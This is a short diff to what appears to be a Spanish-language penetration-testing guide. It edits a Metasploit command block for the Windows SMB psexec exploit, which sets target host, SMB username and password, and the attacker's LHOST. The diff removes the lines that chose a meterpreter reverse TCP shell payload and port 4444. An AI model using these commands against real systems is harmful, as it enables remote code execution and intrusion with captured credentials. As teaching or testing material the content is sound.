@@ -49,9 +49,7 @@ use exploit/windows/smb/psexec
 set RHOSTS <IP_OBJETIVO>
 set SMBUser <USUARIO>
 set SMBPass <CONTRASEÑA>
-set payload windows/meterpreter/reverse_tcp
 set LHOST <TU_IP>
-set LPORT 4444
 exploit
 ```
 
